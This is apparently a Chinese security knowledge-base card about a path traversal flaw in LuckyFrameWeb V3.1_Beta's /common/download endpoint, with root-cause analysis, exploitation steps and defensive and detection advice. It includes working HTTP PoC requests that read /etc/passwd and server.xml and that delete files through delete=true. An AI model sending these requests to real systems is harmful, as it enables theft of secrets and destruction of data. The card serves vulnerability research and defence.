---
id: web-generic-file-inclusion-luckyframeweb-download-filename-traversal
title: LuckyFrameWeb /common/download 直接把 fileName 拼进下载路径：../ 路径穿越任意文件读取与删除
type: scenario
domain: web
path: web/generic/file-inclusion
technique: direct-filename-path-traversal-download
tags:
- web
- java
- file-download
- path-traversal
- arbitrary-file-read
- arbitrary-file-delete
- luckyframeweb
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: V3.1_Beta（原文测试版本）
verification:
  verified_by: verifier-V54
  verified_at: '2026-11-05T08:50:46+08:00'
  notes: 已对照原文及27张图核对：图02 CommonController.fileDownload 中 filePath=LuckyFrameConfig.getDownloadPath()+fileName，fileName 直接来自请求，FileUtils.writeBytes 读出、delete=true 时 FileUtils.deleteFile 删除，realFileName 仅用于 Content-Disposition，与卡一致。原文只做代码分析，未展示实际下载响应/删除截图；卡已标 confidence medium 并注明登录要求取决于 Shiro 过滤链（原文未明确），未验证点保留。版本 V3.1_Beta 为原文审计目标版本，frontmatter 已标注；PoC 未在本机执行。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-luckyframeweb-download-filename-traversal/
draft: false
kb_aliases:
- LuckyFrameWeb 任意文件下载
- fileName 路径穿越
- common/download 任意读取
- 下载接口任意文件删除
- 文件下载目录穿越
---

## 一句话结论

LuckyFrameWeb V3.1_Beta 的 `GET /common/download` 把请求参数 `fileName` 直接拼到下载目录后作为文件路径，未做 `..`、绝对路径或规范化校验；攻击者用 `../` 跳出下载目录即可读取任意文件，配合 `delete=true` 还能删除任意文件。

## 原理

- Controller `fileDownload(String fileName, Boolean delete, HttpServletResponse response, HttpServletRequest request)` 中，`fileName` 完全来自请求参数。
- 路径拼接为 `String filePath = LuckyFrameConfig.getDownloadPath() + fileName;`，没有 `getCanonicalPath()` 校验、没有 `..` 过滤、没有 basename 限制。
- 随后 `FileUtils.writeBytes(filePath, response.getOutputStream())` 把该路径文件内容写入响应；只要进程有读权限，`../../../../etc/passwd`、`../../conf/server.xml`、Windows 的 `..\..\win.ini` 等都可读取。
- 同一路径在 `delete` 为 true 时传给 `FileUtils.deleteFile(filePath)`，因此同一个穿越点还可删除任意文件（如配置文件、日志、会话文件），造成拒绝服务或清除痕迹。
- `realFileName` 只用于 `Content-Disposition` 的下载文件名（`fileName.substring(fileName.indexOf("_") + 1)`），不影响实际读取路径。
- 根因：把“用户提供的文件名”直接当作“下载目录下的相对路径”，目录边界完全依赖字符串拼接；任何未规范化的 `..` 都能逃逸。

## 触发条件

- 目标为 LuckyFrameWeb V3.1_Beta（原文测试版本）。
- `/common/download` 可达；是否需要登录取决于 Shiro 过滤链配置（原文未明确说明，利用前需确认）。
- 运行用户对目标文件有读权限（删除则需写权限）。
- 服务器未对路径参数做 `..`/绝对路径拦截。

## 利用步骤

1. 访问 `/common/download?fileName=test` 确认接口存在并返回下载响应。
2. 用 URL 编码的 `../` 逐级跳出下载目录，例如 `fileName=../../../../etc/passwd` 或 `..%2f..%2f..%2f..%2fetc%2fpasswd`。
3. 观察响应体是否为文件内容；根据报错/响应长度调整层级。
4. 读取目标敏感文件（配置文件、数据库连接串、密钥、源码）验证影响。
5. 如需验证删除，使用测试文件并设置 `delete=true`，不要删除生产关键文件。
6. 记录请求与响应证据；验证后停止。

## PoC

```http
GET /common/download?fileName=..%2f..%2f..%2f..%2fetc%2fpasswd HTTP/1.1
Host: target
```

```http
GET /common/download?fileName=..%2f..%2f..%2f..%2fopt%2ftomcat%2fconf%2fserver.xml&delete=false HTTP/1.1
Host: target
```

删除变体（仅对测试文件验证）：

```http
GET /common/download?fileName=..%2f..%2ftmp%2ftest.txt&delete=true HTTP/1.1
Host: target
```

原文仅给出代码路径与参数可控性分析，未展示实际下载响应截图。

## 变体与关联

- 变体：`fileName` 使用绝对路径（如 `/etc/passwd`）时，若拼接后仍能命中（取决于 `getDownloadPath()` 末尾是否有分隔符），可直接读取。
- 变体：Windows 下用 `..\..\` 或混合分隔符；Tomcat 对 `%2f`、`%5c` 的解码差异可绕过简单过滤。
- 变体：`delete=true` 的任意文件删除可用于删除 `.jar`、配置文件、日志或会话文件，造成服务异常/证据销毁。
- 关联：[[web-generic-file-inclusion-extattrs-filename-traversal-download]]（fileName 来自数据库/客户端并拼路径的同类下载穿越）。
- 关联：[[web-generic-file-inclusion-oa-logfiledownload-createfwfromjoa-arbitrary-read]]、[[web-generic-file-inclusion-windows-backslash-download-traversal]]（下载接口路径穿越的同类案例）。

## 检测与防御

- 防御：下载接口只接受文件 ID/白名单键，服务端查表得到真实路径；不要接受客户端文件名作为路径。
- 防御：拼接后使用 `getCanonicalPath()` 并校验必须以下载目录为前缀；拒绝 `..`、绝对路径、空字节和混合分隔符。
- 防御：把下载目录与 Web 根、配置目录隔离，运行用户仅授予下载目录读权限；删除操作单独鉴权并限制目录。
- 检测：审计 `fileName` 直接拼路径的下载/读取接口；对请求中的 `../`、`%2e%2e`、`..%5c`、绝对路径特征告警。
- 检测：下载接口响应体出现 `/etc/passwd`、`server.xml`、`application.yml` 等敏感文件特征；异常文件删除与下载日志。
